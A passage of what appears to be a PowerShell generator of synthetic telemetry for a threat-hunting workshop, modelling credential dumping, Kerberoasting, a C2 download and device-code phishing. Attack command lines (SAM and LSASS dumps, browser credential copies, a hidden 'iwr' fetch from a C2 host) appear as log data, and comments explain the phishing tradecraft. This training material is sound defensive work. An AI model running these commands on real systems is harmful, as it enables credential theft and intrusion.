            $values.TenantId = $tenantId
            $values.AccountEnabled = $true
            $values.AppId = if ($isMaliciousRiskSpn) { $maliciousOAuthAppId } else { New-StableGuid "risk-spn-app|$riskSpnName" }
            $values.Id = if ($isMaliciousRiskSpn) { $maliciousOAuthSpId } else { New-StableGuid "risk-spn-object|$riskSpnName" }
            $values.DisplayName = $riskSpnName
            $values.IsProcessing = $false
            $values.RiskState = $riskSpnState
            $values.RiskLevel = if ($isMaliciousRiskSpn) { 'high' } elseif ($riskSpnState -eq 'atRisk') { 'medium' } else { 'none' }
            $values.RiskDetail = if ($riskSpnState -eq 'confirmedSafe') { 'adminConfirmedServicePrincipalCompromised' } else { 'none' }
            $values.RiskLastUpdatedDateTime = $timeText
            $values.ServicePrincipalType = 'Application'
            $values.OperationName = 'Risky service principal'
            $values.CorrelationId = New-StableGuid "risk-spn-correlation|$Index"
            $values.SourceSystem = 'Azure AD'
            $values.Type = 'AADRiskyServicePrincipals'
        }
        'AADServicePrincipalRiskEvents' {
            # Also empty in the source tenant. Detections are tied back to the malicious
            # application and the attacker infrastructure used elsewhere in the scenario.
            $spnRiskTemplate = $spnRiskEventCatalog[$Index % $spnRiskEventCatalog.Count]
            $isMaliciousRiskEvent = ($Index % 19) -eq 0
            $riskEventSpnName = if ($isMaliciousRiskEvent) { 'USAG Cyber Sync Helper' } else { $spnDisplayNameCatalog[$Index % $spnDisplayNameCatalog.Count] }

            $values.TenantId = $tenantId
            $values.Activity = $spnRiskTemplate.Activity
            $values.ActivityDateTime = $timeText
            $values.AppId = if ($isMaliciousRiskEvent) { $maliciousOAuthAppId } else { New-StableGuid "risk-event-app|$riskEventSpnName" }
            $values.ServicePrincipalId = if ($isMaliciousRiskEvent) { $maliciousOAuthSpId } else { New-StableGuid "risk-event-spn|$riskEventSpnName" }
            $values.ServicePrincipalDisplayName = $riskEventSpnName
            $values.CorrelationId = New-StableGuid "risk-event-correlation|$Index"
            $values.DetectedDateTime = Format-WorkshopTime $Time.AddMinutes(-1 * (2 + ($Index % 30)))
            $values.DetectionTimingType = $spnRiskTemplate.Detection
            $values.Id = New-StableGuid "risk-event|$Index"
            $values.IpAddress = if ($isMaliciousRiskEvent) { $externalIp } else { '4.156.{0}.{1}' -f (($Index * 3) % 256), (1 + (($Index * 17) % 254)) }
            $values.KeyIds = [object[]]@($maliciousOAuthKeyId)
            $values.LastUpdatedDateTime = $timeText
            $values.Location = if ($isMaliciousRiskEvent) {
                @{ city = 'Amsterdam'; state = 'North Holland'; countryOrRegion = 'NL' }
            }
            else {
                @{ city = 'Boydton'; state = 'Virginia'; countryOrRegion = 'US' }
            }
            $values.RequestId = New-StableGuid "risk-event-request|$Index"
            $values.RiskEventType = $spnRiskTemplate.EventType
            $values.RiskLevel = if ($isMaliciousRiskEvent) { 'high' } else { $spnRiskTemplate.Level }
            $values.RiskState = if ($isMaliciousRiskEvent) { 'atRisk' } else { 'dismissed' }
            $values.RiskDetail = 'none'
            $values.Source = 'IdentityProtection'
            $values.TokenIssuerType = 'AzureAD'
            $values.AdditionalInfo = [object[]]@(
                @{ Key = 'userAgent'; Value = $graphClientUserAgent }
            )
            $values.OperationName = 'Service principal risk detection'
            $values.SourceSystem = 'Azure AD'
            $values.Type = 'AADServicePrincipalRiskEvents'
        }
        default {
            $values.ActionType = 'WorkshopNormalBaseline'
            $values.Application = 'WorkshopNormalBaseline'
        }
    }

    return $values
}

function Get-WorkshopTargetRowCount {
    param([Parameter(Mandatory)][string]$Table)

    $existingCount = $script:Records[$Table].Count
    if ($Table -eq 'AADUserRiskEvents') {
        return $existingCount
    }
    if ($NormalRowsPerTable -eq 0) {
        return $existingCount
    }
    if ($NormalRowsPerTable -lt 0 -and $NormalMinRowsPerTable -gt $NormalMaxRowsPerTable) {
        throw 'NormalMinRowsPerTable cannot be greater than NormalMaxRowsPerTable.'
    }

    $targetRows = if ($NormalRowsPerTable -gt 0) {
        $NormalRowsPerTable
    }
    else {
        Get-WorkshopRandomInt -Minimum $NormalMinRowsPerTable -Maximum ($NormalMaxRowsPerTable + 1)
    }

    return [Math]::Max($existingCount, $targetRows)
}

function Write-WorkshopTableData {
    param([Parameter(Mandatory)][string]$Table)

    $path = Join-Path $OutputDirectory "$Table.json"
    $targetRows = Get-WorkshopTargetRowCount -Table $Table
    $existingCount = $script:Records[$Table].Count
    $rowsToAdd = [Math]::Max(0, $targetRows - $existingCount)
    $tableSeed = [Convert]::ToInt32((New-StableHex $Table 7), 16)
    # Reseed per table so a table's ambient rows are identical whether the script
    # generates every table or only this one. Without this, the shared random stream
    # makes output depend on how many tables ran first, which breaks both -TableName
    # regeneration and parallel generation across worker processes.
    $script:Random = [System.Random]::new($RandomSeed -bxor $tableSeed)
    # Cardinality targets are relative to the row count this table will actually write.
    $script:CurrentTargetRows = [Math]::Max(1, $targetRows)
    Set-WorkshopTableCardinality -Table $Table -TargetRows $script:CurrentTargetRows
    Set-WorkshopTableSamplers -Table $Table
    $encoding = [System.Text.UTF8Encoding]::new($false)
    $stream = [System.IO.FileStream]::new($path, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None, 1048576)
    $writer = [System.IO.StreamWriter]::new($stream, $encoding, 1048576)
    $written = 0

    try {
        foreach ($record in $script:Records[$Table]) {
            $writer.WriteLine(($record | ConvertTo-Json -Compress -Depth 20))
            $written++
        }

        for ($i = 0; $i -lt $rowsToAdd; $i++) {
            $time = New-WorkshopNormalTime
            $index = $tableSeed + $i
            $values = New-NormalTelemetryValues -Table $Table -Time $time -Index $index
            $record = New-WorkshopRecordObject -Table $Table -Values $values -Time $time -Ambient
            if ($null -ne $record) {
                $writer.WriteLine(($record | ConvertTo-Json -Compress -Depth 20))
                $written++
            }
        }
    }
    finally {
        $writer.Dispose()
    }

    Write-Host "Wrote $written row(s) to $path"
}

$stage = 'C:\ProgramData\wrstage'
$attackSteps = @(
    [pscustomobject]@{ Offset = 15; File = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $stage\collect-reg-creds.ps1"; Parent = 'explorer.exe'; Technique = 'T1552.002'; Title = 'Credentials in Registry Script'; Pid = 4101 },
    [pscustomobject]@{ Offset = 22; File = 'reg.exe'; Path = 'C:\Windows\System32\reg.exe'; Command = "reg.exe save HKLM\SAM $stage\sam.save /y"; Parent = 'cmd.exe'; Technique = 'T1003.002'; Title = 'Dump SAM Registry Hive via reg save Command'; Pid = 4102 },
    [pscustomobject]@{ Offset = 27; File = 'esentutl.exe'; Path = 'C:\Windows\System32\esentutl.exe'; Command = "esentutl.exe /y `"C:\Users\$($victor.Name)\AppData\Local\Google\Chrome\User Data\Default\Login Data`" /d $stage\LoginData.db"; Parent = 'powershell.exe'; Technique = 'T1555.003'; Title = 'Collect Browser Data via Esentutl using PowerShell Script'; Pid = 4103 },
    [pscustomobject]@{ Offset = 35; File = "$toolRu.exe"; Path = "$stage\$toolRu.exe"; Command = "$toolRu.exe kerberoast /ldapfilter:`"(servicePrincipalName=*)`" /nowrap /outfile:$stage\roast.txt"; Parent = 'powershell.exe'; Technique = 'T1558.003'; Title = "Kerberoasting using $toolRu"; Pid = 4104 },
    [pscustomobject]@{ Offset = 42; File = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Command = "powershell.exe -NoProfile -ExecutionPolicy Bypass Import-Module .\PowerView.ps1; $kerbCmd -OutputFormat Hashcat"; Parent = 'powershell.exe'; Technique = 'T1558.003'; Title = "Kerberoasting using PowerShell Empire's $kerbCmd Script"; Pid = 4105 },
    [pscustomobject]@{ Offset = 50; File = "$toolProc.exe"; Path = "$stage\$toolProc.exe"; Command = "$toolProc.exe -accepteula -ma $targetLsLower.exe $stage\$targetLsLower.dmp"; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump $targetLs Process to Minidump File"; Pid = 4106 },
    [pscustomobject]@{ Offset = 56; File = "$toolPw.exe"; Path = "$stage\$toolPw.exe"; Command = "$toolPw.exe -o $stage\pwdump7.txt"; Parent = 'cmd.exe'; Technique = 'T1003.002'; Title = "Dump Passwords using $toolPw"; Pid = 4107 },
    [pscustomobject]@{ Offset = 60; File = "$toolGs.exe"; Path = "$stage\$toolGs.exe"; Command = "$toolGs.exe -a > $stage\gsecdump.txt"; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump Passwords using $toolGs"; Pid = 4108 },
    [pscustomobject]@{ Offset = 65; File = "$toolLa.exe"; Path = "$stage\$toolLa.exe"; Command = "$toolLa.exe all -oN -output $stage\lazagne"; Parent = 'cmd.exe'; Technique = 'T1555'; Title = "Dump Passwords using $toolLa"; Pid = 4109 },
    [pscustomobject]@{ Offset = 70; File = 'rundll32.exe'; Path = 'C:\Windows\System32\rundll32.exe'; Command = "rundll32.exe $stage\$toolKiwi.dll,StartW /$secretVerb /exit"; Parent = 'powershell.exe'; Technique = 'T1003.001'; Title = "Dump Windows Passwords with Obfuscated $toolMi"; Pid = 4110 },
    [pscustomobject]@{ Offset = 73; File = "$($toolMi.ToLower()).exe"; Path = "$stage\$($toolMi.ToLower()).exe"; Command = "$($toolMi.ToLower()).exe `"$debugVerb`" `"$secretVerb`" `"exit`""; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump Windows Passwords with Original $toolMi"; Pid = 4111 }
)

foreach ($step in $attackSteps) {
    $time = $StartTime.AddMinutes($step.Offset)
    Add-ProcessEvent -Time $time -FileName $step.File -FolderPath $step.Path -CommandLine $step.Command -Parent $step.Parent -Technique $step.Technique -ProcessId $step.Pid
    Add-Record -Table 'DeviceEvents' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'AntivirusSignatureDetected'
        FileName = $step.File
        FolderPath = $step.Path
        AccountDomain = $adDomain
        AccountName = $victor.Name
        AccountUpn = $victor.Upn
        ProcessCommandLine = $step.Command
        InitiatingProcessFileName = $step.Parent
        ReportId = $step.Pid
        AdditionalFields = "{`"Technique`":`"$($step.Technique)`",`"AttackVector`":`"$($step.Title)`"}"
    }
}

Add-Record -Table 'DeviceRegistryEvents' -Time $StartTime.AddMinutes(16) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(16)
    DeviceId = $win04.DeviceId
    DeviceName = $win04.Name
    ActionType = 'RegistryValueCreated'
    RegistryKey = 'HKEY_CURRENT_USER\Software\USAGCyber\VPN'
    RegistryValueType = 'REG_SZ'
    RegistryValueName = 'SavedPassword'
    RegistryValueData = 'REDACTED_SYNTHETIC_SECRET'
    InitiatingProcessAccountDomain = $adDomain
    InitiatingProcessAccountName = $victor.Name
    InitiatingProcessAccountSid = $victor.Sid
    InitiatingProcessAccountUpn = $victor.Upn
    InitiatingProcessFileName = 'powershell.exe'
    InitiatingProcessCommandLine = 'collect-reg-creds.ps1'
    ReportId = 5101
}

Add-FileEvent -Time $StartTime.AddMinutes(23) -FileName 'sam.save' -FolderPath "$stage\sam.save" -ProcessName 'reg.exe' -ProcessCommandLine "reg.exe save HKLM\SAM $stage\sam.save /y" -ReportId 5201
Add-FileEvent -Time $StartTime.AddMinutes(24) -FileName 'system.save' -FolderPath "$stage\system.save" -ProcessName 'reg.exe' -ProcessCommandLine "reg.exe save HKLM\SYSTEM $stage\system.save /y" -ReportId 5202
Add-FileEvent -Time $StartTime.AddMinutes(28) -FileName 'LoginData.db' -FolderPath "$stage\LoginData.db" -ProcessName 'esentutl.exe' -ProcessCommandLine "esentutl.exe /y Chrome Login Data /d $stage\LoginData.db" -ReportId 5203
Add-FileEvent -Time $StartTime.AddMinutes(51) -FileName "$targetLsLower.dmp" -FolderPath "$stage\$targetLsLower.dmp" -ProcessName "$toolProc.exe" -ProcessCommandLine "$toolProc.exe -accepteula -ma $targetLsLower.exe $stage\$targetLsLower.dmp" -ReportId 5204
Add-FileEvent -Time $StartTime.AddMinutes(76) -FileName 'cred_bundle.zip' -FolderPath "$stage\cred_bundle.zip" -ProcessName 'powershell.exe' -ProcessCommandLine "Compress-Archive $stage\* $stage\cred_bundle.zip" -ReportId 5205

Add-NetworkEvent -Time $StartTime.AddMinutes(14) -RemoteIP $c2Ip -RemotePort 443 -RemoteUrl $c2Host -ProcessName 'powershell.exe' -CommandLine "powershell.exe -nop -w hidden iwr https://$c2Host/a.ps1" -ReportId 5301
Add-NetworkEvent -Time $StartTime.AddMinutes(36) -RemoteIP $dc01.IP -RemotePort 389 -RemoteUrl $dc01.Name -ProcessName "$toolRu.exe" -CommandLine "$toolRu.exe kerberoast /ldapfilter:`"(servicePrincipalName=*)`"" -ReportId 5302
Add-NetworkEvent -Time $StartTime.AddMinutes(37) -RemoteIP $dc01.IP -RemotePort 88 -RemoteUrl $dc01.Name -ProcessName "$toolRu.exe" -CommandLine "$toolRu.exe kerberoast /nowrap" -ReportId 5303
Add-NetworkEvent -Time $StartTime.AddMinutes(80) -RemoteIP $aadc.IP -RemotePort 5985 -RemoteUrl $aadc.Name -ProcessName 'powershell.exe' -CommandLine "Enter-PSSession AADCONNECT01 -Credential $adDomain\$($svcSql.Name)" -ReportId 5304

Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(12) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(12)
    DeviceId = $win04.DeviceId
    DeviceName = $win04.Name
    ActionType = 'LogonSuccess'
    LogonType = 'Interactive'
    AccountDomain = $adDomain
    AccountName = $victor.Name
    AccountSid = $victor.Sid
    Protocol = 'Negotiate'
    IsLocalAdmin = $true
    LogonId = 9001
    RemoteIP = $externalIp
    ReportId = 5401
}
Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(81) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(81)
    DeviceId = $aadc.DeviceId
    DeviceName = $aadc.Name
    ActionType = 'LogonSuccess'
    LogonType = 'RemoteInteractive'
    AccountDomain = $adDomain
    AccountName = $svcSql.Name
    AccountSid = $svcSql.Sid
    Protocol = 'NTLM'
    IsLocalAdmin = $true
    LogonId = 9002
    RemoteDeviceName = $win04.Name
    RemoteIP = $win04.IP
    ReportId = 5402
}

foreach ($queryOffset in 35, 42) {
    Add-Record -Table 'IdentityQueryEvents' -Time $StartTime.AddMinutes($queryOffset) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes($queryOffset)
        ActionType = 'LdapSearch'
        Application = if ($queryOffset -eq 35) { $toolRu } else { 'PowerShell Empire' }
        QueryType = 'Search'
        QueryTarget = 'servicePrincipalName'
        Query = '(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
        Protocol = 'LDAP'
        AccountName = $victor.Name
        AccountDomain = $adDomain
        AccountUpn = $victor.Upn
        AccountSid = $victor.Sid
        AccountObjectId = $victor.ObjectId
        AccountDisplayName = $victor.DisplayName
        DeviceName = $win04.Name
        IPAddress = $win04.IP
        DestinationDeviceName = $dc01.Name
        DestinationIPAddress = $dc01.IP
        DestinationPort = 389
        ReportId = 5500 + $queryOffset
        AdditionalFields = '{"Technique":"T1558.003","Result":"SPN accounts enumerated"}'
    }
}

Add-Record -Table 'IdentityLogonEvents' -Time $StartTime.AddMinutes(37) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(37)
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(37)
    ActionType = 'LogonSuccess'
    Application = 'Kerberos'
    LogonType = 'Network'
    Protocol = 'Kerberos'
    AccountName = $victor.Name
    AccountDomain = $adDomain
    AccountUpn = $victor.Upn
    AccountSid = $victor.Sid
    AccountObjectId = $victor.ObjectId
    AccountDisplayName = $victor.DisplayName
    DeviceName = $win04.Name
    DeviceType = 'Desktop'
    OSPlatform = 'Windows 10'
    IPAddress = $win04.IP
    DestinationDeviceName = $dc01.Name
    DestinationIPAddress = $dc01.IP
    DestinationPort = 88
    TargetAccountDisplayName = $svcSql.DisplayName
    Location = 'DE'
    ISP = 'INTERNAL_NETWORK'
    ReportId = 5601
    AdditionalFields = '{"ServicePrincipalName":"MSSQLSvc/sql01.usag-cyber.local:1433","TicketEncryptionType":"RC4_HMAC"}'
    UncommonForUser = @('ActionType', 'ISP')
    LastSeenForUser = @{ ActionType = -1; OSPlatform = 0; ISP = -1; UserAgent = 0; IPAddress = -1; Application = -1 }
    TenantId = ''
    Type = 'IdentityLogonEvents'
    SourceSystem = ''
}
Add-Record -Table 'IdentityLogonEvents' -Time $StartTime.AddMinutes(81) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(81)
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(81)
    ActionType = 'LogonSuccess'
    Application = 'WinRM'
    LogonType = 'RemoteInteractive'
    Protocol = 'NTLM'
    AccountName = $svcSql.Name
    AccountDomain = $adDomain
    AccountUpn = $svcSql.Upn
    AccountSid = $svcSql.Sid
    AccountObjectId = $svcSql.ObjectId
    AccountDisplayName = $svcSql.DisplayName
    DeviceName = $win04.Name
    DeviceType = 'Desktop'
    OSPlatform = 'Windows 10'
    IPAddress = $win04.IP
    DestinationDeviceName = $aadc.Name
    DestinationIPAddress = $aadc.IP
    DestinationPort = 5985
    Location = 'DE'
    ISP = 'INTERNAL_NETWORK'
    ReportId = 5602
    AdditionalFields = '{"CredentialSource":"Kerberoasted service account"}'
    UncommonForUser = @('ActionType', 'ISP')
    LastSeenForUser = @{ ActionType = -1; OSPlatform = 0; ISP = -1; UserAgent = 0; IPAddress = -1; Application = -1 }
    TenantId = ''
    Type = 'IdentityLogonEvents'
    SourceSystem = ''
}
Add-Record -Table 'IdentityDirectoryEvents' -Time $StartTime.AddMinutes(86) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(86)
    ActionType = 'AccountModified'
    Application = 'Active Directory'
    TargetAccountUpn = $svcSync.Upn
    TargetAccountDisplayName = $svcSync.DisplayName
    DestinationDeviceName = $dc01.Name
    DestinationIPAddress = $dc01.IP
    DestinationPort = 389
    Protocol = 'LDAP'
    AccountName = $svcSql.Name
    AccountDomain = $adDomain
    AccountUpn = $svcSql.Upn
    AccountSid = $svcSql.Sid
    AccountObjectId = $svcSql.ObjectId
    AccountDisplayName = $svcSql.DisplayName
    DeviceName = $aadc.Name
    IPAddress = $aadc.IP
    ReportId = 5701
    AdditionalFields = '{"Change":"Service account delegation settings read","Tier":"0"}'
}

# ===========================================================================
# ACT 1 - Device code phishing (T1566 -> T1078.004 -> T1550.001)
#
# Closes the gap where the investigation previously began with an already
# compromised account. Midnight Blizzard abused the OAuth 2.0 device authorization
# grant in the campaign AWS disrupted in August 2025, and Microsoft reported signed
# RDP file phishing in October 2024. Both are modeled here.
#
# The tradecraft detail that makes this hard to catch: the victim visits the genuine
# microsoft.com/devicelogin page and satisfies real MFA, so no malicious domain and no
# credential prompt ever appear. Only the device code grant itself gives it away.
#
# A benign twin is emitted alongside it. A platform engineer performs legitimate
# device code authentication from a corporate address on a compliant device in the same
# window, so students must discriminate on evidence rather than on the technique alone.
# ===========================================================================
$deviceCodeAppId = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'   # Microsoft Azure CLI
$deviceCodeAppName = 'Microsoft Azure CLI'
$graphResourceId = '00000003-0000-0000-c000-000000000000'
$phishSenderDomain = 'usag-cyber-portal.example'
$phishSenderAddress = "secure-docs@$phishSenderDomain"
$phishNetworkMessageId = New-StableGuid 'devicecode-phish-message'
$phishSubject = 'Action required: verify your device for the USAG Cyber secure document portal'
$deviceLoginUrl = 'https://microsoft.com/devicelogin'
$phishLureUrl = "https://$phishSenderDomain/verify?ref=usagcyber"
$deviceCodeUserCode = 'FKDNW7XHM'
$phishTime = $StartTime.AddMinutes(-45)
$clickTime = $StartTime.AddMinutes(-40)
$deviceCodeAuthTime = $StartTime.AddMinutes(-38)
$tokenRedeemTime = $StartTime.AddMinutes(-37)
$deviceCodeAlertTime = $StartTime.AddMinutes(-35)

Add-Record -Table 'EmailEvents' -Time $phishTime -Values @{
    Timestamp = Format-WorkshopTime $phishTime
    TimeGenerated = Format-WorkshopTime $phishTime
    NetworkMessageId = $phishNetworkMessageId
    InternetMessageId = "<$(New-StableHex 'devicecode-phish-internet' 24)@$phishSenderDomain>"
    SenderMailFromAddress = $phishSenderAddress
    SenderFromAddress = $phishSenderAddress
    SenderDisplayName = 'USAG Cyber Document Portal'
    SenderMailFromDomain = $phishSenderDomain
    SenderFromDomain = $phishSenderDomain
    SenderIPv4 = $c2Ip
    RecipientEmailAddress = $victor.Upn
    RecipientObjectId = $victor.ObjectId
    RecipientDomain = $tenantDomain
    Subject = $phishSubject
    EmailDirection = 'Inbound'
    DeliveryAction = 'Delivered'
    DeliveryLocation = 'Inbox/folder'
    LatestDeliveryAction = 'Delivered'
    LatestDeliveryLocation = 'Inbox/folder'
    ThreatTypes = ''
    DetectionMethods = ''
    ConfidenceLevel = ''
    EmailAction = 'None'
    AuthenticationDetails = '{"SPF":"pass","DKIM":"pass","DMARC":"pass","CompAuth":"pass"}'
    AttachmentCount = 1
    UrlCount = 2
    EmailLanguage = 'en'
    EmailSize = 38214
    IsFirstContact = $true
    EmailClusterId = 2961084011
    ReportId = New-StableGuid 'devicecode-phish-report'
    To = @($victor.Upn)
    OrgLevelAction = 'None'
    UserLevelAction = 'None'
    AdditionalFields = '{"Technique":"T1566","Scenario":"Device code phishing lure","ThreatActor":"MIDNIGHT BLIZZARD","Note":"Authentication passed because the lure domain was newly registered and correctly configured"}'
}

foreach ($phishUrl in @(
        [pscustomobject]@{ Url = $phishLureUrl; Domain = $phishSenderDomain; Position = 0 }
        [pscustomobject]@{ Url = $deviceLoginUrl; Domain = 'microsoft.com'; Position = 1 }
    )) {
    Add-Record -Table 'EmailUrlInfo' -Time $phishTime -Values @{
        Timestamp = Format-WorkshopTime $phishTime
        TimeGenerated = Format-WorkshopTime $phishTime
        NetworkMessageId = $phishNetworkMessageId
        Url = $phishUrl.Url
        UrlDomain = $phishUrl.Domain
        UrlLocation = 'Body'
        UrlChainId = New-StableGuid 'devicecode-phish-chain'
        UrlChainPosition = $phishUrl.Position
        ReportId = '6002'
    }
}

Add-Record -Table 'EmailAttachmentInfo' -Time $phishTime -Values @{
    Timestamp = Format-WorkshopTime $phishTime
    TimeGenerated = Format-WorkshopTime $phishTime
    NetworkMessageId = $phishNetworkMessageId
    SenderFromAddress = $phishSenderAddress
    SenderDisplayName = 'USAG Cyber Document Portal'
    RecipientEmailAddress = $victor.Upn
    RecipientObjectId = $victor.ObjectId
    FileName = 'USAG_Cyber_Secure_Portal.rdp'
    FileType = 'rdp'
    FileExtension = 'rdp'
    SHA256 = (Get-WorkshopHashSet -ContentKey 'devicecode-phish-rdp').SHA256
    FileSize = 2874
    ThreatTypes = ''
    DetectionMethods = ''
    ReportId = '6003'
}

Add-Record -Table 'UrlClickEvents' -Time $clickTime -Values @{
    Timestamp = Format-WorkshopTime $clickTime
    TimeGenerated = Format-WorkshopTime $clickTime
    Url = $phishLureUrl
    ActionType = 'ClickAllowed'
    AccountUpn = $victor.Upn
    Workload = 'Email'
    NetworkMessageId = $phishNetworkMessageId
    ThreatTypes = ''
    DetectionMethods = ''
    IPAddress = $externalIp
    IsClickedThrough = $true
    UrlChain = "$phishLureUrl,$deviceLoginUrl"
    AppName = 'Outlook'
    AppVersion = '16.0.17928.20114'
    SourceId = New-StableGuid 'devicecode-phish-click'
    ReportId = '6004'
}

# The genuine device code authentication. AuthenticationProtocol is the single field
# that separates this from ordinary interactive sign-in noise.
$deviceCodeSignIn = @{
    Timestamp = Format-WorkshopTime $deviceCodeAuthTime
    TimeGenerated = Format-WorkshopTime $deviceCodeAuthTime
    CreatedDateTime = Format-WorkshopTime $deviceCodeAuthTime
    AADTenantId = $tenantId
    Application = $deviceCodeAppName
    ApplicationId = $deviceCodeAppId
    AppDisplayName = $deviceCodeAppName
    AppId = $deviceCodeAppId
    ResourceDisplayName = 'Microsoft Graph'
    ResourceId = $graphResourceId
    ResourceIdentity = $graphResourceId
    AccountDisplayName = $victor.DisplayName
    AccountObjectId = $victor.ObjectId
    AccountUpn = $victor.Upn
    UserPrincipalName = $victor.Upn
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    Identity = $victor.DisplayName
    IPAddress = $externalIp
    Country = 'NL'
    State = 'Noord-Holland'
    City = 'Amsterdam'
    Location = 'NL'
    LogonType = 'deviceCode'
    AuthenticationProtocol = 'deviceCode'
    IncomingTokenType = 'none'
    ClientAppUsed = 'Mobile Apps and Desktop clients'
    ConditionalAccessStatus = 'success'
    AuthenticationRequirement = 'multiFactorAuthentication'
    DeviceTrustType = 'Unmanaged'
    IsInteractive = $true
    IsManaged = $false
    IsCompliant = $false
    ResultType = '0'
    ResultDescription = 'Success'
    ErrorCode = 0
    RiskLevelDuringSignIn = 'high'
    RiskLevelAggregated = 'high'
    RiskState = 'atRisk'
    RiskEventTypes = '["unfamiliarFeatures","anonymousIPAddress"]'
    TokenIssuerType = 'AzureAD'
    UserAgent = 'python-requests/2.32.3'
    CorrelationId = New-StableGuid 'devicecode-correlation'
    SessionId = New-StableGuid 'devicecode-session'
    ReportId = 6101
    AdditionalFields = '{"Technique":"T1566,T1078.004","Scenario":"Device code phishing token issuance","ThreatActor":"MIDNIGHT BLIZZARD","UserCode":"' + $deviceCodeUserCode + '"}'
}
Add-Record -Table 'EntraIdSignInEvents' -Time $deviceCodeAuthTime -Values $deviceCodeSignIn
Add-Record -Table 'AADSignInEventsBeta' -Time $deviceCodeAuthTime -Values $deviceCodeSignIn

Add-Record -Table 'SigninLogs' -Time $deviceCodeAuthTime -Values @{
    TimeGenerated = Format-WorkshopTime $deviceCodeAuthTime
    CreatedDateTime = Format-WorkshopTime $deviceCodeAuthTime
    AADTenantId = $tenantId
    AppDisplayName = $deviceCodeAppName
    AppId = $deviceCodeAppId
    AuthenticationMethodsUsed = 'Password,Microsoft Authenticator push'
    AuthenticationRequirement = 'multiFactorAuthentication'
    AuthenticationProtocol = 'deviceCode'
    IncomingTokenType = 'none'
    ClientAppUsed = 'Mobile Apps and Desktop clients'
    ConditionalAccessStatus = 'success'
    CorrelationId = New-StableGuid 'devicecode-correlation'
    DeviceDetail = @{ operatingSystem = 'Unknown'; browser = 'Other'; isCompliant = $false; trustType = 'Unmanaged' }
    Id = New-StableGuid 'devicecode-signin-log'
    Identity = $victor.DisplayName
    IPAddress = $externalIp
    IsInteractive = $true
    IsRisky = $true
    Location = 'NL'
    LocationDetails = @{ city = 'Amsterdam'; state = 'Noord-Holland'; countryOrRegion = 'NL'; geoCoordinates = @{ latitude = 52.3676; longitude = 4.9041 } }
    MfaDetail = '{"authMethod":"Microsoft Authenticator push","authDetail":"MFA completed by the victim on the genuine Microsoft device login page"}'
    OperationName = 'Sign-in activity'
    ResourceDisplayName = 'Microsoft Graph'
    ResourceIdentity = $graphResourceId
    ResultType = '0'
    ResultDescription = 'Success'
    RiskLevel = 'high'
    RiskLevelDuringSignIn = 'high'
    RiskState = 'atRisk'
    RiskEventTypes = 'unfamiliarFeatures,anonymousIPAddress'
    Status = @{ errorCode = 0; failureReason = 'Other'; additionalDetails = 'MFA requirement satisfied by claim in the token' }
    Type = 'SigninLogs'
    UserAgent = 'python-requests/2.32.3'
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    UserType = 'Member'
}

# Refresh token redemption against a second first-party client. This is the FOCI
# cross-client pivot that makes a stolen device code token so valuable.
Add-Record -Table 'AADNonInteractiveUserSignInLogs' -Time $tokenRedeemTime -Values @{
    TimeGenerated = Format-WorkshopTime $tokenRedeemTime
    CreatedDateTime = Format-WorkshopTime $tokenRedeemTime
    AADTenantId = $tenantId
    AppDisplayName = 'Microsoft Graph Command Line Tools'
    AppId = '14d82eec-204b-4c2f-b7e8-296a70dab67e'
    AuthenticationProtocol = 'none'
    IncomingTokenType = 'primaryRefreshToken'
    ClientAppUsed = 'Mobile Apps and Desktop clients'
    ConditionalAccessStatus = 'notApplied'
    CorrelationId = New-StableGuid 'devicecode-foci-correlation'
    Id = New-StableGuid 'devicecode-foci-signin'
    IPAddress = $externalIp
    IsInteractive = $false
    Location = 'NL'
    ResourceDisplayName = 'Microsoft Graph'
    ResourceIdentity = $graphResourceId
    ResultType = '0'
    ResultDescription = 'Success'
    UserAgent = 'python-requests/2.32.3'
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    Type = 'AADNonInteractiveUserSignInLogs'
}

$deviceCodeBehaviorId = New-StableGuid 'devicecode-behavior'
Add-Record -Table 'BehaviorInfo' -Time $deviceCodeAlertTime -Values @{
    Timestamp = Format-WorkshopTime $deviceCodeAlertTime
    TimeGenerated = Format-WorkshopTime $deviceCodeAlertTime
    BehaviorId = $deviceCodeBehaviorId
    ActionType = 'DeviceCodeAuthenticationFromUnfamiliarLocation'
    Title = 'Device code authentication from an unfamiliar location'
    Description = 'A device code grant completed for this user from an address and client never previously seen for them, shortly after a phishing message was delivered.'
    Categories = 'InitialAccess'
    AttackTechniques = 'T1566,T1078.004,T1550.001'
    ServiceSource = 'Microsoft Defender XDR'
    DetectionSource = 'Behavior analytics'
    DataSources = 'SigninLogs,EmailEvents,UrlClickEvents'
    AccountUpn = $victor.Upn
    AccountObjectId = $victor.ObjectId
    StartTime = Format-WorkshopTime $phishTime
    EndTime = Format-WorkshopTime $deviceCodeAlertTime
    Insights = 'Device code grant is unused by this account in the previous 90 days'
    MachineGroup = 'Workstations'
